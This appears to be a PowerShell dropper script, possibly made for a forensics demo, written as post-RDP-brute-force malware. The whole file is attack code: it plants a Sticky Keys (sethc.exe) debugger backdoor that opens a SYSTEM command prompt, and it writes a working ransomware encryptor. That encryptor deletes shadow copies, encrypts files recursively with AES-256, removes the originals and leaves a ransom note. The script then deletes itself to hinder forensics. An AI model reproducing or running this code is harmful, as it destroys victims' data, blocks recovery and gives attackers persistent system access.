# ==============================================================================
# NAME: setup.ps1 (The Dropper)
# ROLE: Initial Access Stager & Persistence Provider
# TARGET: Windows Workstation (Post-RDP Brute Force)
# ==============================================================================

Write-Host "[*] Initializing deployment environment..." -ForegroundColor Gray

# --- 1. PRIVILEGE VERIFICATION ---
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[-] WARNING: Limited privileges. Persistence may fail." -ForegroundColor Red
}

# --- 2. ESTABLISH PERSISTENCE (MITRE T1546.012) ---
# Purpose: Create a SYSTEM-level backdoor via Sticky Keys (Shift x5)
Write-Host "[*] Configuring permanent foothold (IFEO)..." -ForegroundColor Gray
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"

try {
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    # Redirect Sticky Keys (sethc.exe) to Command Prompt
    New-ItemProperty -Path $regPath -Name "Debugger" -Value "cmd.exe" -PropertyType String -Force | Out-Null
    Write-Host "[+] Persistence established: Accessibility Backdoor." -ForegroundColor Cyan
} catch {
    Write-Host "[-] Persistence failed: Access Denied to HKLM." -ForegroundColor Red
}

# --- 3. PROVISION AES-256 TOOLS ---
# These are the weaponized payloads for Phase 3 (Impact)
Write-Host "[*] Extracting attack tools..." -ForegroundColor Gray

$encCode = @'
param([string]$Target = ".\", [string]$SecretKey = "AI-DEMO-2026")

function Encrypt-File {
    param([string]$FilePath, [string]$Password)
    $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $Salt = [System.Text.Encoding]::UTF8.GetBytes("Forensics-Demo-Salt")
    $DeriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $Salt, 1000)
    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.KeySize = 256
    $Aes.Key = $DeriveBytes.GetBytes(32)
    $Aes.GenerateIV()
    $IV = $Aes.IV
    $Encryptor = $Aes.CreateEncryptor()
    $EncryptedBytes = $Encryptor.TransformFinalBlock($FileBytes, 0, $FileBytes.Length)
    $FinalBytes = $IV + $EncryptedBytes
    [System.IO.File]::WriteAllBytes($FilePath + ".locked", $FinalBytes)
    Remove-Item $FilePath -Force
}

Write-Host "[!] INHIBITING RECOVERY..." -ForegroundColor Red
vssadmin.exe delete shadows /all /quiet | Out-Null

$ResolvedPath = (Resolve-Path $Target).Path
Get-ChildItem -Path $ResolvedPath -File -Exclude "*.locked","encrypt.ps1","decrypt.ps1","setup.ps1","READ_ME_NOW.txt" -Recurse | ForEach-Object {
    try {
        Encrypt-File -FilePath $_.FullName -Password $SecretKey
        Write-Host "LOCKED: $($_.Name)" -ForegroundColor Yellow
    } catch { Write-Host "Skipping: $($_.Name)" -ForegroundColor Gray }
}

$note = "--- >>> ALL YOUR FILES ARE ENCRYPTED WITH AES-256 <<< ---`r`n`r`nYour backups were deleted. Personal ID: $($env:COMPUTERNAME)-AES"
$note | Set-Content (Join-Path $ResolvedPath "READ_ME_NOW.txt")
Start-Process notepad.exe (Join-Path $ResolvedPath "READ_ME_NOW.txt")
'@

$decCode = @'
param([string]$Key, [string]$Target = ".\")
function Decrypt-File {
    param([string]$FilePath, [string]$Password)
    $RawBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $Salt = [System.Text.Encoding]::UTF8.GetBytes("Forensics-Demo-Salt")
    $IV = $RawBytes[0..15]
    $CipherBytes = $RawBytes[16..($RawBytes.Length - 1)]
    $DeriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $Salt, 1000)
    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Key = $DeriveBytes.GetBytes(32)
    $Aes.IV = $IV
    $Decryptor = $Aes.CreateDecryptor()
    $DecryptedBytes = $Decryptor.TransformFinalBlock($CipherBytes, 0, $CipherBytes.Length)
    [System.IO.File]::WriteAllBytes($FilePath.Replace(".locked", ""), $DecryptedBytes)
    Remove-Item $FilePath -Force
}
if ($Key -eq "AI-DEMO-2026") {
    Get-ChildItem -Path (Resolve-Path $Target).Path -Filter *.locked -Recurse | ForEach-Object {
        try { Decrypt-File $_.FullName $Key; Write-Host "RESTORED: $($_.Name)" -ForegroundColor Cyan } catch {}
    }
}
'@

[System.IO.File]::WriteAllText("$PWD\encrypt.ps1", $encCode)
[System.IO.File]::WriteAllText("$PWD\decrypt.ps1", $decCode)

# --- 4. ANTI-FORENSICS SELF-DELETE ---
Write-Host "[+] Staging complete. Cleaning up dropper..." -ForegroundColor Green
Remove-Item $MyInvocation.MyCommand.Path -Force
